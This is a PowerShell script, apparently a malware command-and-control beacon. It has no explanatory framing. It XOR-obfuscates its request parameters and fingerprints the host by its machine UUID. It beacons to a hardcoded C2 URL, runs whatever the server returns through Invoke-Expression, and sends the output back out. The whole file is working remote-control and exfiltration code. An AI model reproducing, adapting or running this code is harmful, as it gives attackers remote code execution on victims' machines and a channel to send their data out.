function Xor-String {
    param (
        [string]$InputString,
        [int]$XorKey
    )
    
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($InputString)
    for ($i = 0; $i -lt $bytes.Length; $i++) {
        $bytes[$i] = $bytes[$i] -bxor $XorKey
    }
    
    [System.Text.Encoding]::UTF8.GetString($bytes)
}

$c2_url = "http://compromised.server/control/control.php?"

##
## [Part 1] Sending system unique ID to server in order to initialize
##
## Build the URL for the server request with unique ID as parameters
## The format of the URL will be: 
##   http://server-url.com/control/control.php?type=ini&data=[unique ID]
##

# Get the system's unique ID
$unique_id = (Get-WmiObject Win32_ComputerSystemProduct).UUID
# Truncate the ID to 6 characters
$unique_id = $unique_id.Substring(0, 6)

$type = Xor-String -InputString "type" -XorKey 7
$type_value = Xor-String -InputString "ini" -XorKey 7
$data = Xor-String -InputString "data" -XorKey 7
$data_value = Xor-String -InputString $unique_id -XorKey 7

# Build the URL with the unique ID as a query parameter
$parameter = "{0}={1}&{2}={3}" -f $type, $type_value, $data, $data_value;
$url = $c2_url + $parameter

# Send a GET request to the server and get the response
$response = Invoke-WebRequest $url

# Save the response as a PowerShell variable
Set-Variable -Name "res" -Value $response.Content

# Set the culture to English
$prevCulture = [System.Threading.Thread]::CurrentThread.CurrentCulture
[System.Threading.Thread]::CurrentThread.CurrentCulture = 'en-US'

# Might receive "data"
$result = Invoke-Expression $res 

##
## [Part 2] Sending system date to server
##
## Build the URL for the server request with the system date and unique ID as parameters
## The format of the URL will be: 
##   http://server-url.com/control/control.php?type=date&uid=[unique ID]&data=[system date]
##

$uid = Xor-String -InputString "uid" -XorKey 7
$uid_value = Xor-String -InputString $unique_id -XorKey 7
$type_value = Xor-String -InputString "date" -XorKey 7
$data_value = Xor-String -InputString $result -XorKey 7

$parameter = "{0}={1}&{2}={3}&{4}={5}" -f $type, $type_value, $uid, $uid_value, $data, $data_value;
$url = $c2_url + $parameter
$response = Invoke-WebRequest $url



